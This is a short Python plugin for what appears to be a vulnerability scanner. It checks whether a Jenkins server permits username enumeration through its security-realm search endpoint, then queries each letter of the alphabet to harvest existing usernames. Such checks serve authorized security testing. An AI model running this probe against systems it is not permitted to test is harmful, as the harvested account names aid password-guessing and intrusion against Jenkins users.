#!/usr/bin/env python
# -*- coding:utf-8 -*-
# https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'user_enumeration'
        self.info = "Check the Jenkins username enumeration"
        self.keyword = ['all', 'jenkins', 'enum', 'enumeration', 'web', 'user', 'username']
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        result = ""
        poc_data = "/securityRealm/user/admin/search/index?q="
        random_str = random8string()
        url_base1 = "http://%s:%d"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s"%(ip, int(port), add_web_path)
        url_base2 = "https://%s:%d"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s"%(ip, int(port), add_web_path)
        try:
            req = Requester(url_base1+poc_data+random_str)
            if "Search for '%s'"%(random_str) in req.html:
                result = "exists Jenkins username enumeration"
                valid_url = url_base1+poc_data
        except RequesterOpenError:
            try:
                req = Requester(url_base2+poc_data+random_str)
                if "Search for '%s'"%(random_str) in req.html:
                    result = "exists Jenkins username enumeration"
                    valid_url = url_base2+poc_data
            except: pass
        except: pass

        if result == "":
            return
        re_result = []
        pattern = re.compile(r'\?q=(.*?)">', re.DOTALL)
        for letter in [chr(i) for i in range(97,123)]:
            try:
                req = Requester(valid_url+letter)
                tmp_re_result = pattern.findall(req.html)
                re_result = list(set(tmp_re_result+re_result))
            except:
                pass
        result = result + 'Found user:' + str(re_result)
        self._output(ip, port, result)

globals()['VulnChecker'] = VulnChecker